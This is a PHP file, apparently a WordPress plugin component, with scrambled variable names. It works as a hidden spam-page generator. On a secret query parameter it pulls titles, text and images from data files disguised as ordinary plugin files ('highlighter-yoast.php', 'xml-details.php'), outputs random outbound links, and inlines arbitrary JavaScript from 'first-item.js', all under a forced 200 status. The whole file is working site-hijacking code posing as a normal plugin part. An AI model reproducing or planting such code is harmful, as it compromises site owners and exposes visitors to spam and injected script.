<?php
$uMPDv = intval(get_query_var('rhwurbhzyf'));

if ($uMPDv < 1 || $uMPDv > 4067) return;
$yrKC2qI = file(plugin_dir_path(__FILE__).'highlighter-yoast.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$cSxJMkt4Su = explode(';', $yrKC2qI[$uMPDv]);
if (count($cSxJMkt4Su) < 2) return;
$nzsQO6Q = $cSxJMkt4Su[0];
$dC6jT  = $cSxJMkt4Su[1];
$yuc5fi1 = $cSxJMkt4Su[2];
$qNNcH  = $cSxJMkt4Su[3];
$lzKR7MPK = $cSxJMkt4Su[4];
set_query_var('ewjmgt', $nzsQO6Q);

$ezwNO = '';
$mqjAVRmeqS = plugin_dir_path(__FILE__).'xml-details.php';
if (is_file($mqjAVRmeqS)) {
	$sAlGe = file($mqjAVRmeqS, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($sAlGe);
	shuffle($sAlGe);
	$eYJ5tMxm = mt_rand(2, 5);
	if (count($sAlGe) > $eYJ5tMxm) {
		for ($lfKd0QP = 0; $lfKd0QP < $eYJ5tMxm; $lfKd0QP++) {
			$qPLpZft = array_shift($sAlGe);
			$ezwNO .= '<p><a href="'.$qPLpZft.'">'.$qPLpZft.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $nzsQO6Q; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $dC6jT . "</p>\n";
				if (strlen($qNNcH) > 0) echo "<p>" . $qNNcH . "</p>\n";
				if (strlen($yuc5fi1) > 0) echo "<p>" . $yuc5fi1 . "</p>\n";
				if (strlen($lzKR7MPK) > 0) echo '<p><a href="#"><img src="'.$lzKR7MPK.'"></a>' . "</p>\n";
				echo $ezwNO;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$yRS7PR = plugin_dir_path(__FILE__) . 'first-item.js';
if (is_file($yRS7PR)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($yRS7PR);
	echo '</script>';
}
get_footer();
?>
